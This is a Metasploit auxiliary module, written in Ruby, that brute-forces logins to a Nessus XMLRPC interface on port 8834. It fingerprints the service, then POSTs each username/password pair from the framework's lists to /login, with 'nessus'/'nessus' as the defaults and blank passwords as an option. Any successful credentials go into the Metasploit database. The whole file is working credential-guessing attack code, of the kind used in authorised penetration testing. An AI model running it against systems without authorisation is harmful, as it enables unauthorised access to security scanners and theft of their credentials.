##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Nessus XMLRPC Interface Login Utility',
      'Description'    => %q{
        This module simply attempts to login to a Nessus XMLRPC interface using a
        specific user/pass.
      },
      'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'SSL' => true }
    )

    register_options(
      [
        Opt::RPORT(8834),
        OptString.new('URI', [true, "URI for Nessus XMLRPC login. Default is /login", "/login"]),
        OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false])
      ])
  end

  def run_host(ip)
    begin
      res = send_request_cgi({
        'uri'     => datastore['URI'],
        'method'  => 'GET'
        }, 25)
      http_fingerprint({ :response => res })
    rescue ::Rex::ConnectionError => e
      vprint_error("#{datastore['URI']} - #{e}")
      return
    end

    if not res
      vprint_error("#{datastore['URI']} - No response")
      return
    end
    if res.code != 403
      vprint_error("Authorization not requested")
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def do_login(user='nessus', pass='nessus')
    vprint_status("Trying username:'#{user}' with password:'#{pass}'")
    headers = {}

    begin
      res = send_request_cgi({
        'encode'    => true,
        'uri'       => datastore['URI'],
        'method'    => 'POST',
        'headers'   => headers,
        'vars_post' => {
          'login'    => user,
          'password' => pass
        }
      }, 25)

    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("HTTP Connection Failed, Aborting")
      return :abort
    end

    if not res
      print_error("Connection timed out, Aborting")
      return :abort
    end

    if res.code != 200
      vprint_error("FAILED LOGIN. '#{user}' : '#{pass}'")
      return :skip_pass
    end

    if res.code == 200
      if res.body =~ /<status>OK<\/status>/
        print_good("SUCCESSFUL LOGIN. '#{user}':'#{pass}'")
        report_cred(
          ip: datastore['RHOST'],
          port: datastore['RPORT'],
          service_name: 'nessus-xmlrpc',
          user: user,
          password: pass
        )
        return :next_user
      end
    end
    vprint_error("FAILED LOGIN. '#{user}':'#{pass}'")
    return :skip_pass
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
